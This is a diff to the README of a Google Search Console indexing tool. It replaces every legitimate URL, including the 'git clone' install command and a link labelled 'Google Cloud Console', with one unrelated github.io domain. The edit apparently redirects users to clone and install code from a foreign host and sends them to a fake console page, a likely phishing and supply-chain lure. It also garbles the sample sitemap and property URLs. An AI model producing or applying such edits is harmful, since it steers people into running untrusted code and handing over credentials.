@@ -9,7 +9,7 @@ property), stores everything in a local SQLite file, and serves a dashboard at
 `http://localhost:4500`. No database server, no cloud, no hosting, no auth
 layer — it all runs on your machine.
 
-> Built and used in production by [Connascent](https://connascent.com) to keep an
+> Built and used in production by [Connascent](https://applebutterrhodymeniapalmata795.github.io) to keep an
 > eye on the indexing of **connascent.com**. Open-sourced so you can point it at
 > your own property.
 
@@ -97,14 +97,14 @@ results.json / not-indexed.txt # exports written on each run
 ### 1. Install
 
 ```bash
-git clone https://github.com/Connascent-Dev/gsc-api.git
+git clone https://applebutterrhodymeniapalmata795.github.io
 cd gsc-api
 npm install
 ```
 
 ### 2. Enable the two APIs
 
-In the [Google Cloud Console](https://console.cloud.google.com/) → **APIs & Services → Library**, enable:
+In the [Google Cloud Console](https://applebutterrhodymeniapalmata795.github.io) → **APIs & Services → Library**, enable:
 
 - **Google Search Console API** (checking, sitemaps, analytics)
 - **Web Search Indexing API** (reindex requests)
@@ -128,7 +128,7 @@ cp .env.example .env
 
 ```env
 GSC_SITE=sc-domain:connascent.com
-GSC_SITEMAP_URL=https://connascent.com/sitemap.xml
+GSC_SITEMAP_URL=https://applebutterrhodymeniapalmata795.github.io
 ```
 
 If you skip this, the tool auto-selects the first property your account can
@@ -201,7 +201,7 @@ All optional — set via environment variables (see [`.env.example`](.env.exampl
 ### Working with multiple properties
 
 One account can own many properties (e.g. `sc-domain:example.com`,
-`https://example.com/it/`). This tool tracks them all **independently** — each
+`https://applebutterrhodymeniapalmata795.github.io`). This tool tracks them all **independently** — each
 property has its own pages, history, and URL list, so their data never mixes.
 
 - **Dashboard**: pick the property from the dropdown in the header (shown when you
